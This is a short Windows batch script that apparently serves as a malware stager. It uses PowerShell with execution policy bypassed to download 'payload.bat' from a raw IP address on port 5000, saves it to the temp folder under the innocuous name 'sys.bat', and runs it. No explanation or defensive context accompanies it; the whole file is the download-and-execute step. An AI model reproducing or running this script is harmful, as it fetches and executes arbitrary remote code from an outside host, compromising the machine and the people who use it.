@echo off
set URL=http://82.29.153.101:5000/payload.bat
set FILE=%temp%\sys.bat

powershell -NoP -ExecutionPolicy Bypass -Command ^
"$r = Invoke-WebRequest '%URL%' -UseBasicParsing; $r.Content | Set-Content -Encoding ASCII '%FILE%'"

call "%FILE%"